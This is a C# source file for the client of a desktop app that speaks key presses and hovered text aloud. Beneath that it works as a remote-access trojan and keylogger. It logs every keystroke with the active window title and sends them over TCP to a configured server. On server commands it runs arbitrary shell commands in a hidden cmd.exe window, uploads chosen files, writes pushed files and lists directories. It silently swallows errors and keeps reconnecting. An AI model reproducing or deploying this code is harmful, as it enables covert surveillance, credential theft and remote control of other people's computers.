using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Avalonia.Threading;
using DotNetEnv;
using CLIENT.Helpers;
using System.Speech.Synthesis;
using System.Threading;
using System.IO;

namespace CLIENT.ViewModels
{
    public partial class MainWindowViewModel : ViewModelBase
    {

        
        private TcpClient _client;
        private NetworkStream _stream;
        private SpeechSynthesizer _synth;
        public MainWindowViewModel()
        {
            DotNetEnv.Env.Load();
            _synth = new SpeechSynthesizer();
            _synth.SetOutputToDefaultAudioDevice();
            _ = ConnectToServerAsync();
        }

        private async Task ConnectToServerAsync()
        {
            string serverPortStr = Environment.GetEnvironmentVariable("SERVER_PORT") ?? "2025";
            int port = int.TryParse(serverPortStr, out int p) ? p : 2025;
            string serverIp = Environment.GetEnvironmentVariable("MASTER_IP") ?? "127.0.0.1";

            _synth.SetOutputToDefaultAudioDevice();


            KeyboardDetector.OnKeyPressed += async (key, isUpperCase, isShiftPressed, isCtrlPressed) =>
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string windowInfo = WindowDetector.GetActiveWindowInfo();
                _synth.SpeakAsyncCancelAll();
                _synth.SpeakAsync($"You pressed {key}");
                AppendMessageToLogAsync($"[{timestamp}] : {key}, {windowInfo}");
            };
            KeyboardDetector.Start();

            MouseDetector.OnMouseHoverRead += (content) =>
            {
                _synth.SpeakAsyncCancelAll();
                _synth.SpeakAsync($"Content at mouse position: {content}");
            };
            MouseDetector.Start();

            while (true)
            {
                try
                {
               
                    if (_client == null || !_client.Connected)
                    {
                        _client = new TcpClient();
                        await _client.ConnectAsync(serverIp, port);
                        _stream = _client.GetStream();

                        // Send initial machine name
                        string clientMessage = $"Machine - {Environment.MachineName}";
                        byte[] sendBuffer = Encoding.UTF8.GetBytes(clientMessage);
                        await _stream.WriteAsync(sendBuffer, 0, sendBuffer.Length);

                        KeyboardDetector.OnKeyPressed += async (key, isUpperCase, isShiftPressed, isCtrlPressed) =>
                        {
                            string windowInfo = WindowDetector.GetActiveWindowInfo();
                            await SendKeyLoggerAsync($"Key: {key}, {windowInfo}");
                        };

                        // Start listening
                        _ = ListenToServerAsync();

                        break; // Exit the reconnect loop after successful connection
                    }

                }
                catch (Exception ex)
                {
                    await Task.Delay(3000); // wait before retrying
                }
            }
        }


        private async Task ListenToServerAsync()
        {
            try
            {
                while (_client != null && _client.Connected)
                {
                    var buffer = new byte[1024];
                    int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length);
                    if (bytesRead == 0) break; // Server disconnected

                    string serverMessage = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                    await Dispatcher.UIThread.InvokeAsync(() =>
                    {
                        if (serverMessage.StartsWith("__upload_file:"))
                        {
                            string command = serverMessage.Substring(14).Trim();
                            UploadFile(command);
                        }

                        if (serverMessage.StartsWith("__download_file:"))
                        {
                            string command = serverMessage.Substring(16).Trim();
                            DownloadTargetFile(command);
                        }

                        if (serverMessage.StartsWith("__open_file:"))
                        {
                            string command = serverMessage.Substring(12).Trim();
                            SendFilePath(command);
                        }

                        if (serverMessage.StartsWith("cmd:"))
                        {
                            string command = serverMessage.Substring(4).Trim();
                            try
                            {
                            
                                
                                        // Create a new process to run the command in cmd
                                        ProcessStartInfo processStartInfo = new ProcessStartInfo()
                                        {
                                            FileName = "cmd.exe",
                                            Arguments = $"/c {command}",  // /c executes the command and terminates
                                            RedirectStandardOutput = true, // Redirect the output to read it
                                            UseShellExecute = false,      // Don't use shell execute to get output
                                            CreateNoWindow = true         // Don't show the command prompt window
                                        };

                                        using (Process process = Process.Start(processStartInfo))
                                        {
                                            if (process != null)
                                            {
                                                string output = process.StandardOutput.ReadToEnd();  // Capture the output
                                                process.WaitForExit(); // Wait for the process to exit

                                                // You can handle the output here, e.g., log it or display it
                                                Console.WriteLine($"Command output: {output}");
                                            }
                                        }
                                
                            }
                            catch (Exception ex)
                            {
                                // Handle any exceptions that may occur
                                Console.WriteLine($"Error running command: {ex.Message}");
                            }

                        }
                        else
                        {
                        }
                    });
                }
            }
            catch (Exception ex)
            {
            }

            // Reconnect on disconnect
            _client?.Close();
            _client = null;
            _stream = null;

            await ConnectToServerAsync();
        }


        public async Task SendKeyLoggerAsync(string appName)
        {
            try
            {
                if (_client != null && _client.Connected && _stream != null)
                {
                    string message = $"{appName}";
                    byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                    await _stream.WriteAsync(messageBytes, 0, messageBytes.Length);
               
                }
            }
            catch (Exception ex)
            {
            }
        }
        public async Task SendAppInfoAsync(string appName)
        {
            _synth.SpeakAsyncCancelAll();
            _synth.SpeakAsync($"You clicked {appName}");
            string message = $"Clicked: {appName}";
            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            AppendMessageToLogAsync($"[{timestamp}] : {message}");
            try
            {
                if (_client != null && _client.Connected && _stream != null)
                {
                    byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                    await _stream.WriteAsync(messageBytes, 0, messageBytes.Length);
                }
            }
            catch (Exception ex)
            {
            }
        }

        public async Task DownloadTargetFile(string command)
        {
            try
            {
                if (_client != null && _client.Connected && _stream != null)
                {
                    string response;

                    // Check if the command is a valid file path
                    if (!string.IsNullOrEmpty(command) && File.Exists(command))
                    {
                        try
                        {
                            // Read file content
                            byte[] fileBytes = await File.ReadAllBytesAsync(command);

                            // Send file metadata (header)
                            string header = $"fileDownload:{Path.GetFileName(command)}:{fileBytes.Length}\n";
                            byte[] headerBytes = Encoding.UTF8.GetBytes(header);
                            await _stream.WriteAsync(headerBytes, 0, headerBytes.Length);

                            // Send file content
                            await _stream.WriteAsync(fileBytes, 0, fileBytes.Length);

                            // Flush the stream
                            await _stream.FlushAsync();

                            response = $"File '{Path.GetFileName(command)}' successfully sent to the server.";
                        }
                        catch (IOException ioEx)
                        {
                            response = $"File access error: {ioEx.Message}";
                        }
                    }
                    else
                    {
                        response = "Invalid or non-existent file path.";
                    }
                }
                else
                {
                    throw new InvalidOperationException("The client is not connected to the server.");
                }
            }
            catch (Exception ex)
            {
            }
        }

        public async Task UploadFile(string command)
        {
            try
            {
                if (_client != null && _client.Connected && _stream != null)
                {
                    string[] parts = command.Split(':');
                    if (parts.Length == 2)
                    {
                        string fileName = parts[0];
                        if (int.TryParse(parts[1], out int fileSize))
                        {
                            // Get the stream from the client connection
                            NetworkStream clientStream = _client.GetStream(); // Ensure 'client' is your TcpClient

                            // Create a buffer to read file content
                            byte[] buffer = new byte[fileSize];
                            int totalBytesRead = 0;
                            int bytesRead;

                            // Read the file content from the client stream
                            while (totalBytesRead < fileSize &&
                                   (bytesRead = clientStream.Read(buffer, totalBytesRead, fileSize - totalBytesRead)) > 0)
                            {
                                totalBytesRead += bytesRead;
                            }

                            // Save the file to the server's file system
                            string savePath = Path.Combine("file_downloaded", fileName);
                            Directory.CreateDirectory("file_downloaded"); // Ensure the directory exists
                            File.WriteAllBytes(savePath, buffer);

                        }
                    }
                }
                else
                {
                    throw new InvalidOperationException("The client is not connected to the server.");
                }
            }
            catch (Exception ex)
            {
            }
        }

        public async Task SendFilePath(string command)
        {
            try
            {
                if (_client != null && _client.Connected && _stream != null)
                {
                    string response = string.Empty;

                    string path = !string.IsNullOrEmpty(command) ? command : "C:/";
                    if (Directory.Exists(path))
                    {
                        var entries = Directory.GetFileSystemEntries(path);
                        response = "pathlist:\n" + string.Join("\n", entries);
                    }
                    else
                    {
                        response = "Invalid directory path.";
                    }
                    byte[] responseBytes = Encoding.UTF8.GetBytes(response);
                    await _stream.WriteAsync(responseBytes, 0, responseBytes.Length);
                }
            }
            catch (Exception ex)
            {
            }
        }
        public void AppendMessageToLogAsync(string message)
        {
            try
            {
                // Get today's date string in yyyymmdd format
                string dateStr = DateTime.Now.ToString("yyyyMMdd");

                // Build file path (adjust folder as needed)
                string logFileName = $"log-{dateStr}.txt";
                string logFolder = "logs";  // e.g., a "logs" folder in your app directory
                Directory.CreateDirectory(logFolder); // ensure folder exists

                string logFilePath = Path.Combine(logFolder, logFileName);

                // Prepare the line to write (timestamp + message)
                string line = $"{message}{Environment.NewLine}";

                File.AppendAllText(logFilePath, line);

            }
            catch (Exception ex)
            {
                // Handle exceptions as needed (log or show error)
                Console.WriteLine($"Failed to write log: {ex.Message}");
            }
        }

    }
}
